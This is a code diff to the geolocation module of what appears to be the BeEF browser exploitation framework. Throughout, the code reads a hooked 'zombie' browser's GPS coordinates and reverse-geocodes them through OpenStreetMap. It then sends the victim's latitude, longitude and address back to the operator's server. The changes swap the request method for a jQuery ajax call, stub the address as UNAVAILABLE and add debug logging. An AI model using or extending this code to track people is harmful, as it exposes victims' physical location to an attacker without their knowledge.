@@ -16,20 +16,31 @@ beef.geolocation = {
      * given latitude/longitude retrieves exact street position of the zombie
      */
     getOpenStreetMapAddress: function(command_url, command_id, latitude, longitude){
-        beef.net.request(
-			 'http://nominatim.openstreetmap.org/reverse?format=json&lat=' + latitude + '&lon=' + longitude + '&zoom=18&addressdetails=1',
-		     'GET',
-			 function(response) {
-                 if(response.length > 0) {
-                     var jsonData = JSON.parse(response);
-                     beef.net.sendback(command_url, command_id, "latitude=" + latitude
+
+        $j.ajax({
+            dataType: "json",
+            error: function(xhr, status, error){
+                console.log("[geolocation.js] openstreetmap error");
+                beef.net.sendback(command_url, command_id, "latitude=" + latitude
                              + "&longitude=" + longitude
-                             + "&openStreetMap=" + escape(jsonData.display_name)
+                             + "&openStreetMap=UNAVAILABLE"
                              + "&geoLocEnabled=True");
-                 }
-             },
-			 ''
-        );
+                },
+            success: function(data, status, xhr){
+                console.log("[geolocation.js] openstreetmap success");
+                // commenting it for now, it seems there are issues with the returned json
+                //var jsonData = $j.parseJSON(data);
+                beef.net.sendback(command_url, command_id, "latitude=" + latitude
+                             + "&longitude=" + longitude
+                             //+ "&openStreetMap=" + jsonData.display_name
+                             + "&openStreetMap=UNAVAILABLE"
+                             + "&geoLocEnabled=True");
+                },
+            type: "get",
+            url: "http://nominatim.openstreetmap.org/reverse?format=json&lat=" +
+                latitude + "&lon=" + longitude + "&zoom=18&addressdetails=1"
+        });
+
     },
 
     /*
@@ -41,14 +52,16 @@ beef.geolocation = {
 	        beef.net.sendback(command_url, command_id, "latitude=NOT_ENABLED&longitude=NOT_ENABLED&geoLocEnabled=False");	
 			return;
 		}
-		
+        console.log("[geolocation.js] navigator.geolocation.getCurrentPosition");
         navigator.geolocation.getCurrentPosition( //note: this is an async call
 			function(position){ // success
 				var latitude = position.coords.latitude;
         		var longitude = position.coords.longitude;
+                console.log("[geolocation.js] success getting position. latitude [%d], longitude [%d]", latitude, longitude);
                 beef.geolocation.getOpenStreetMapAddress(command_url, command_id, latitude, longitude);
 
 			}, function(error){ // failure
+                    console.log("[geolocation.js] error [%d] getting position", error.code);
 					switch(error.code) // Returns 0-3
 					{
 						case 0:
